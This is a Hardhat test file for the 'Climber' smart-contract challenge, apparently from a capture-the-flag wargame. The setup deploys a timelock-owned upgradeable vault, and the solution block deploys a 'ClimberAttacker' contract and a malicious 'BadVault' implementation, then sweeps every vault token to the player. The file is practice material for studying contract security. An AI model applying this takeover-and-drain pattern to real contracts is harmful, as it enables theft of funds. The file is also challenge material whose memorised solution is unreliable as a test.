const { ethers, upgrades, tracer } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
const { setTracerTag } = require("../common/utils");

const fs = require('fs');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();
        setTracerTag(deployer.address, "Deployer");
        setTracerTag(proposer.address, "Proposer");
        setTracerTag(sweeper.address, "Sweeper");
        setTracerTag(player.address, "Player");

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // hack: copy the library ABIs into artifact/ so that hardhat-tracer can
        // recognize these contracts while their source code is absent
        if (tracer) {
            fs.copyFileSync('node_modules/@openzeppelin/upgrades-core/artifacts/@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol/ERC1967Proxy.json', 'artifacts/ERC1967Proxy.json');
        }
        setTracerTag("0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775", "ADMIN_ROLE");
        setTracerTag("0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1", "PROPOSER_ROLE");

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);

        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');

        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        console.log("\n=== Exploit Begin ===\n");

        const attackerContract = await (
            await ethers.getContractFactory("ClimberAttacker", player)
        ).deploy(timelock.address);

        const badVault = await (
            await ethers.getContractFactory("BadVault", player)
        ).deploy();

        await attackerContract.attack(vault.address, badVault.address);

        await vault.connect(player).sweepFunds(token.address);

        console.log("\n=== Exploit End ===\n");
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
